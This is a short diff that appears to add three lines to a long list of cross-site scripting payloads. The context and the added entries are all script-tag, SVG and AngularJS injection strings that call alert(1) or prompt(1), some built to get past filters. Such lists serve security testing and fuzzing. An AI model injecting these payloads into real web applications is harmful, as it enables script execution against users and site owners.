@@ -1234,3 +1234,6 @@ xmlns:x="http://www.w3.org/1999/xhtml ">alert(1&#00000041;
 <script>delete prompt;prompt(1)</script>
 <svg onload = alert('&#x000005cu0031')>
 <x ng-focus=x=$event id=f tabindex=0><x ng-if=[1].map(x.view.alert)>
+"%0a/><script>//alert(1)//
+<SCRIPT FOR=window EVENT=onfocus>alert(1)</SCRIPT>
+<svg><x><script>alert(1)</x>
